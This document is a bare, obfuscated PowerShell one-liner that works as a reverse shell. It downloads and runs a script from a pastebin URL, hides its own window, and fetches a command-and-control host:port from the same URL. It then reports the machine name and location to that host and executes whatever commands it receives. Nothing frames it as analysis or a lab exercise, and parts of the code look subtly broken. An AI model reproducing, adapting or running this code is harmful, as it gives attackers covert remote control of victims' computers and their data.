$ErrorActionPreference='SilentlyContinue';iex(New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/F4fUrSeS');$s='https://pastebin.com/raw/F4fUrSeS';$i=30;$c=$f;$h=[System.Text.Encoding]::ASCII;Add-Type -Name W -Namespace Win32 -M @' [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr,int); '@;[Win32.W]::ShowWindow((Get-Process -Id $PID).MainWindowHandle,0);function t($s,$t=5){$c=New-Object System.Net.Sockets.TcpClient;$a=$c.ConnectAsync($s.Split(':')[0],[int]$s.Split(':')[1]);if($a.Wait($t*1e3)){$c.Close();$true}else{$c.Close();$f}};function g{$r=iwr $s -UseB -To 10;try{if($r.StatusCode-200 -eq 0 -and $r.Content.Trim()-match'^[a-zA-Z0-9.-]+\:[0-9]+$'){$r.Content.Trim()}}catch{}};function r($s){$p=$s.Split(':');$c=New-Object System.Net.Sockets.TcpClient($p[0],$p[1]);$st=$c.GetStream();$b=New-Object byte[]4096;try{$i="PS|$env:COMPUTERNAME|$(gl)|$(date)";$ib=$h.GetBytes($i+"`n");$st.Write($ib,0,$ib.Length);while($c.Connected-t $s 2){$rb=$st.Read($b,0,$b.Length);if($rb-eq0){b};$cmd=$h.GetString($b,0,$rb).Trim();if($cmd-eq'exit'){b};try{$o=iex $cmd 2>&1|%{$_};if(-not$o){$o='[No output]`n'}}catch{$o="Error: $($_.Exception.Message)`n"};$ob=$h.GetBytes($o);$st.Write($ob,0,$ob.Length);$st.Flush()}}catch{}}$f={if($c){$c.Close()}};while(1){if(-not$c-or-not t $currentServer){$currentServer=g;if($currentServer){r $currentServer;$c=$f}}Start-Sleep$i}
